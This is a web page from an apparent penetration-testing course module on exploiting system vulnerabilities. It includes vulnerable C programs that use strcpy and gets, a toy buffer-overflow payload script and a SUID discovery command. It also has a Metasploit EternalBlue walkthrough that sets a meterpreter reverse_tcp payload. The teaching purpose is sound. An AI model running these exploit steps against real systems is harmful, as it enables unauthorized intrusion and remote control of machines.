<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exploitation of System Vulnerabilities</title>

    <link rel="alternate" href="https://campusempresa.com/mod/pentesting/04-04-explotacion-sistemas" hreflang="es" />
	<link rel="alternate" href="https://campusempresa.cat/mod/pentesting/04-04-explotacion-sistemas" hreflang="ca" />
	<link rel="alternate" href="https://enterprisecampus.net/mod/pentesting/04-04-explotacion-sistemas" hreflang="en" />
    
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
	<link href="/css/site.css" rel="stylesheet">
	
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  	<script type="text/javascript" src="/js/math_init.js"></script>
  	<script type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js"></script>
  	<script type="text/javascript" src="/js/cookie.js"></script>
  	<script type="text/javascript" src="/js/main.js"></script>
</head>

<body >
    <div id="content">
		<div id="header" class="container-xxl">
	<div class="row">
		<div class="col-12 col-md-8 p-2 p-md-0">
			<h1 class="m-0 p-0">
				<a href="/"><img src="/img/logo-header_enterprise.png"></a>
			</h1>
		</div>
		<div class="col-12 col-md-4 p-2 p-md-0 text-end">
			<h2 id="main_title"><cite>Building today's and tomorrow's society</cite></h2>
			<h3 id="main_subtitle"></h3>
		</div>
	</div>
</div>
<div class="container-xxl" style="margin-top: -1em;">
	<div class="row">
		<div class="col-12 p-2 p-md-0 m-0 text-end">
													<b id="lit_lang_es" class="px-2">EN</b>
				|
				<a href="https://campusempresa.com/mod/pentesting/04-04-explotacion-sistemas" class="px-2">ES</a></b>
				|
				<a href="https://campusempresa.cat/mod/pentesting/04-04-explotacion-sistemas" class="px-2">CA</a>
					</div>
	</div>
</div>
   <div class="top-bar container-fluid">
	<div class="container-xxl">
		<div class="row">
			<div class="col" id="left_menu">
				<a href="/objective">The Project</a>
				<a href="/about">About Us</a>
				<a href="/contribute">Contribute</a>
				<a href="/donate">Donations</a>
				<a href="/licence">License</a>
			</div>
		</div>
	</div>
   </div>

<div class="container-xxl" id="main_content">
	<div class="row">
		<div class="col-12 col-lg-8">
			<div id="nav1" class="navigation"></div>
			<div id="inner_content">
								<div class='row navigation'>
	<div class='col-2'>
					<a href='04-03-explotacion-red' title="Exploitation of Network Vulnerabilities">&#x25C4;Previous</a>
			</div>
	<div class='col-8 text-center'>
					<a href="./"><h2 style="text-decoration:underline">Exploitation of System Vulnerabilities</h2></a>
			</div>
	<div class='col-2 text-end'>
					<a href='05-01-escalada-de-privilegios' title="Privilege Escalation">Next &#x25BA;</a>
			</div>
</div>
<div class='content'></div><h1><p>Introduction</p>
</h1>
<div class='content'><p>Exploitation of system vulnerabilities involves identifying and leveraging weaknesses in operating systems, software, and configurations to gain unauthorized access or control over a target system. This module will cover various techniques and tools used to exploit system vulnerabilities, providing practical examples and exercises to reinforce the concepts.</p>
</div><h1><p>Key Concepts</p>
</h1>
<div class='content'><ol>
<li>
<p><strong>Understanding System Vulnerabilities</strong>:</p>
<ul>
<li><strong>Types of Vulnerabilities</strong>: Buffer overflows, privilege escalation, code execution, etc.</li>
<li><strong>Common Vulnerabilities and Exposures (CVE)</strong>: A list of publicly disclosed vulnerabilities.</li>
</ul>
</li>
<li>
<p><strong>Exploitation Techniques</strong>:</p>
<ul>
<li><strong>Buffer Overflow</strong>: Overwriting memory to execute arbitrary code.</li>
<li><strong>Privilege Escalation</strong>: Gaining higher-level permissions.</li>
<li><strong>Remote Code Execution (RCE)</strong>: Executing code on a remote system.</li>
</ul>
</li>
<li>
<p><strong>Tools for Exploitation</strong>:</p>
<ul>
<li><strong>Metasploit Framework</strong>: A powerful tool for developing and executing exploit code.</li>
<li><strong>Exploit-DB</strong>: A repository of exploits and proof-of-concepts.</li>
</ul>
</li>
</ol>
</div><h1><p>Detailed Explanation</p>
</h1>
<div class='content'></div><h2><ol>
<li>Understanding System Vulnerabilities</li>
</ol>
</h2>
<div class='content'><p>System vulnerabilities can arise from various sources, including software bugs, misconfigurations, and outdated software. These vulnerabilities can be exploited to gain unauthorized access or control over a system.</p>
<h4>Types of Vulnerabilities</h4>
<ul>
<li><strong>Buffer Overflow</strong>: Occurs when more data is written to a buffer than it can hold, leading to adjacent memory being overwritten.</li>
<li><strong>Privilege Escalation</strong>: Exploiting a vulnerability to gain higher-level permissions than initially granted.</li>
<li><strong>Remote Code Execution (RCE)</strong>: Allows an attacker to execute arbitrary code on a remote system.</li>
</ul>
</div><h2><ol start="2">
<li>Exploitation Techniques</li>
</ol>
</h2>
<div class='content'><h4>Buffer Overflow</h4>
<p>A buffer overflow occurs when data exceeds the buffer's storage capacity, leading to adjacent memory being overwritten. This can be exploited to execute arbitrary code.</p>
<p><strong>Example: Buffer Overflow in C</strong></p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KCnZvaWQgdnVsbmVyYWJsZV9mdW5jdGlvbihjaGFyICpzdHIpIHsKICAgIGNoYXIgYnVmZmVyWzEwXTsKICAgIHN0cmNweShidWZmZXIsIHN0cik7IC8vIE5vIGJvdW5kcyBjaGVja2luZwp9CgppbnQgbWFpbigpIHsKICAgIGNoYXIgbGFyZ2Vfc3RyaW5nWzI1Nl07CiAgICBtZW1zZXQobGFyZ2Vfc3RyaW5nLCAnQScsIDI1NSk7CiAgICBsYXJnZV9zdHJpbmdbMjU1XSA9ICdcMCc7CiAgICB2dWxuZXJhYmxlX2Z1bmN0aW9uKGxhcmdlX3N0cmluZyk7CiAgICByZXR1cm4gMDsKfQ=="))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void vulnerable_function(char *str) {
    char buffer[10];
    strcpy(buffer, str); // No bounds checking
}

int main() {
    char large_string[256];
    memset(large_string, 'A', 255);
    large_string[255] = '\0';
    vulnerable_function(large_string);
    return 0;
}</pre></div><div class='content'><p><strong>Explanation</strong>:</p>
<ul>
<li>The <code>vulnerable_function</code> copies the input string to a buffer without checking its size.</li>
<li>If the input string exceeds the buffer size, it overwrites adjacent memory, potentially leading to code execution.</li>
</ul>
<h4>Privilege Escalation</h4>
<p>Privilege escalation involves exploiting a vulnerability to gain higher-level permissions.</p>
<p><strong>Example: Exploiting SUID Programs in Linux</strong></p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBGaW5kIFNVSUQgcHJvZ3JhbXMKZmluZCAvIC1wZXJtIC00MDAwIC10eXBlIGYgMj4vZGV2L251bGwKCiMgRXhwbG9pdCBhIHZ1bG5lcmFibGUgU1VJRCBwcm9ncmFtCi4vdnVsbmVyYWJsZV9zdWlkX3Byb2dyYW0="))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Find SUID programs
find / -perm -4000 -type f 2&gt;/dev/null

# Exploit a vulnerable SUID program
./vulnerable_suid_program</pre></div><div class='content'><p><strong>Explanation</strong>:</p>
<ul>
<li>SUID (Set User ID) programs run with the permissions of the file owner.</li>
<li>If a SUID program is vulnerable, it can be exploited to gain root privileges.</li>
</ul>
</div><h2><ol start="3">
<li>Tools for Exploitation</li>
</ol>
</h2>
<div class='content'><h4>Metasploit Framework</h4>
<p>Metasploit is a widely-used tool for developing and executing exploit code.</p>
<p><strong>Example: Using Metasploit to Exploit a Vulnerability</strong></p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBTdGFydCBNZXRhc3Bsb2l0Cm1zZmNvbnNvbGUKCiMgU2VhcmNoIGZvciBhbiBleHBsb2l0CnNlYXJjaCB0eXBlOmV4cGxvaXQgcGxhdGZvcm06d2luZG93cwoKIyBVc2UgYW4gZXhwbG9pdAp1c2UgZXhwbG9pdC93aW5kb3dzL3NtYi9tczE3XzAxMF9ldGVybmFsYmx1ZQoKIyBTZXQgdGhlIHRhcmdldApzZXQgUkhPU1QgMTkyLjE2OC4xLjEwCgojIFNldCB0aGUgcGF5bG9hZApzZXQgUEFZTE9BRCB3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfdGNwCnNldCBMSE9TVCAxOTIuMTY4LjEuNQoKIyBSdW4gdGhlIGV4cGxvaXQKZXhwbG9pdA=="))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Start Metasploit
msfconsole

# Search for an exploit
search type:exploit platform:windows

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set the target
set RHOST 192.168.1.10

# Set the payload
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5

# Run the exploit
exploit</pre></div><div class='content'><p><strong>Explanation</strong>:</p>
<ul>
<li><code>msfconsole</code> starts the Metasploit console.</li>
<li><code>search</code> finds an exploit for a specific platform.</li>
<li><code>use</code> selects the exploit.</li>
<li><code>set</code> configures the target and payload.</li>
<li><code>exploit</code> runs the exploit.</li>
</ul>
</div><h1><p>Practical Exercises</p>
</h1>
<div class='content'></div><h2><p>Exercise 1: Buffer Overflow Exploit</p>
</h2>
<div class='content'><p><strong>Objective</strong>: Write a simple buffer overflow exploit for a vulnerable C program.</p>
<p><strong>Vulnerable Program</strong>:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KCnZvaWQgdnVsbmVyYWJsZV9mdW5jdGlvbihjaGFyICpzdHIpIHsKICAgIGNoYXIgYnVmZmVyWzEwXTsKICAgIHN0cmNweShidWZmZXIsIHN0cik7IC8vIE5vIGJvdW5kcyBjaGVja2luZwp9CgppbnQgbWFpbigpIHsKICAgIGNoYXIgaW5wdXRbMjU2XTsKICAgIHByaW50ZigiRW50ZXIgaW5wdXQ6ICIpOwogICAgZ2V0cyhpbnB1dCk7CiAgICB2dWxuZXJhYmxlX2Z1bmN0aW9uKGlucHV0KTsKICAgIHJldHVybiAwOwp9"))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void vulnerable_function(char *str) {
    char buffer[10];
    strcpy(buffer, str); // No bounds checking
}

int main() {
    char input[256];
    printf(&quot;Enter input: &quot;);
    gets(input);
    vulnerable_function(input);
    return 0;
}</pre></div><div class='content'><p><strong>Exploit Code</strong>:</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBFeHBsb2l0IHNjcmlwdAppbXBvcnQgc3RydWN0CgojIEFkZHJlc3MgdG8gb3ZlcndyaXRlIChleGFtcGxlIGFkZHJlc3MpCnJldF9hZGRyZXNzID0gMHhkZWFkYmVlZgoKIyBQYXlsb2FkOiAnQScgKiAxNCArIHJldF9hZGRyZXNzCnBheWxvYWQgPSBiJ0EnICogMTQgKyBzdHJ1Y3QucGFjaygnPEknLCByZXRfYWRkcmVzcykKCnByaW50KHBheWxvYWQp"))));alert("Copied!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Exploit script
import struct

# Address to overwrite (example address)
ret_address = 0xdeadbeef

# Payload: 'A' * 14 + ret_address
payload = b'A' * 14 + struct.pack('&lt;I', ret_address)

print(payload)</pre></div><div class='content'><p><strong>Solution</strong>:</p>
<ul>
<li>Compile the vulnerable program: <code>gcc -o vulnerable vulnerable.c</code></li>
<li>Run the exploit script: <code>python exploit.py</code></li>
<li>Copy the payload and provide it as input to the vulnerable program.</li>
</ul>
</div><h2><p>Exercise 2: Privilege Escalation</p>
</h2>
<div class='content'><p><strong>Objective</strong>: Identify and exploit a vulnerable SUID program on a Linux system.</p>
<p><strong>Steps</strong>:</p>
<ol>
<li>Find SUID programs: <code>find / -perm -4000 -type f 2&gt;/dev/null</code></li>
<li>Analyze a vulnerable SUID program.</li>
<li>Exploit the program to gain root privileges.</li>
</ol>
<p><strong>Solution</strong>:</p>
<ul>
<li>Identify a vulnerable SUID program.</li>
<li>Analyze the program to find the vulnerability.</li>
<li>Craft an exploit to gain root privileges.</li>
</ul>
</div><h1><p>Common Mistakes and Tips</p>
</h1>
<div class='content'><ul>
<li><strong>Buffer Overflow</strong>: Ensure you understand how memory is managed and the impact of overwriting memory.</li>
<li><strong>Privilege Escalation</strong>: Be cautious when analyzing SUID programs and understand the implications of exploiting them.</li>
<li><strong>Metasploit</strong>: Familiarize yourself with Metasploit commands and modules to effectively use the tool.</li>
</ul>
</div><h1><p>Conclusion</p>
</h1>
<div class='content'><p>In this module, we explored the exploitation of system vulnerabilities, covering key concepts, techniques, and tools. We provided practical examples and exercises to reinforce the learned concepts. Understanding and exploiting system vulnerabilities is a critical skill in penetration testing, enabling you to assess and improve the security of systems and applications.</p>
</div><div class='row navigation'>
	<div class='col-2'>
					<a href='04-03-explotacion-red' title="Exploitation of Network Vulnerabilities">&#x25C4;Previous</a>
			</div>
	<div class='col-8 text-center'>
			</div>
	<div class='col-2 text-end'>
					<a href='05-01-escalada-de-privilegios' title="Privilege Escalation">Next &#x25BA;</a>
			</div>
</div>

			</div>
		</div>
		<div class="col-12 col-lg-4 publi" id="div_publi">
			<h1>Advertising</h1>
			<p>This space is reserved for advertising.</p>
			<p>If you want to be a sponsor, contact us to include links in this area: <a href='mailto:admin@campusempresa.cat'>admin@campusempresa.cat</a></p>
			<p>Thank you for collaborating!</p>
		</div>
	</div>
</div>

   <div class="container-xxl my-3">
	<div class="row">
		<div class="col">
			<footer>&copy; Copyright 2024. All rights reserved</footer>
		</div>
	</div>
</div>	

<div id="cookies_adv" style="display:none;">
	We use cookies to improve your user experience and offer content tailored to your interests.
    <a href="#" id="btn_accept_cookies" class="button">Accept</a>
    <a href="/cookies">More Information</a>
</div>	

	</div>    
</body>
</html>
